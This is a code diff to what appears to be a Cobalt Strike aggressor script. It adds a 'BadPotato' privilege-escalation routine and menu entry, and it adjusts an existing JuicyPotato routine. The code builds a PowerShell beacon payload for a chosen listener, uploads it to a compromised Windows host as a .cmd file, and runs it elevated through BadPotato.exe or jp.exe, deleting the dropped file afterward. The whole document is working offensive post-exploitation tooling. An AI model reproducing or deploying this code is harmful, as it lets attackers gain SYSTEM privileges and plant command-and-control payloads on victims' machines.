@@ -3,17 +3,11 @@
 
 sub RunJuicyPotato{
     btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via JuicyPotato");
-    local('$payload $handle $call $port $id $fname $total');
-    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
-    $total = 8;
+    local('$payload $handle $call $port $id $fname');
     $call = $3['Call'];
     $port = $3['Port'];
     $id = $3['CLSID'];
-    while($total >= 0){
-        $fname = $fname.rand(@array);
-        $total = $total - 1;
-    }
-    $fname = $fname.".cmd";
+    $fname = Getname().".cmd";
     if ($call eq "CreateProcessWithTokenW"){
         $call = "t";
     }
@@ -39,6 +33,18 @@ sub RunJuicyPotato{
     bupload!($bid, $fname);
     bshell!($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
     exec("cmd.exe /C del /F ".$fname);
+}
+
+sub BadPotato{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via BadPotato");
+    local('$payload $handle $fname');
+    $fname = Getname().".cmd";
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload!($bid, $fname);
+    bexecute_assembly($bid, script_resource("post/BadPotato.exe"), $fname);
 }
 
 sub CVE_2018_8120{
@@ -173,6 +179,14 @@ sub cve_2019_0803{
             item "Sweet-Potato"{
                 $bid = $1['@'];
                 $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
+                dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "Exploit");
+                dialog_show($Dialog);
+            }
+            item "Bad-Potato"{
+                $bid = $1['@'];
+                $Dialog = dialog("Bad Potato",%(bid => $bid),&BadPotato);
                 dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
                 drow_listener($Dialog, "listener", "Listener: ");
                 dbutton_action($Dialog, "Exploit");
